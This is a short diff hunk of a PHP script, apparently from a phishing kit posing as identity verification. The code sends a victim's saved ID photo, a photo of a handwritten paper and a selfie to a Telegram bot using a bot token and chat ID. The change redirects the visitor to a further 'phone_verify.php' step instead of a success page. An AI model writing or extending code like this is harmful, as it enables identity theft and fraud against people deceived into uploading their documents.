@@ -95,7 +95,7 @@ if ($id_data && $paper_data && $selfie_data) {
         sendPhotoToTelegram($botToken, $chatId, $selfie_filename, $caption_selfie);
         
         // 6. Redirigir al siguiente paso
-        header('Location: verification_success.php');
+        header('Location: ../../phone_verify.php');
         exit;
     } else {
         // ERROR: Falló al guardar en el disco (problema de permisos)
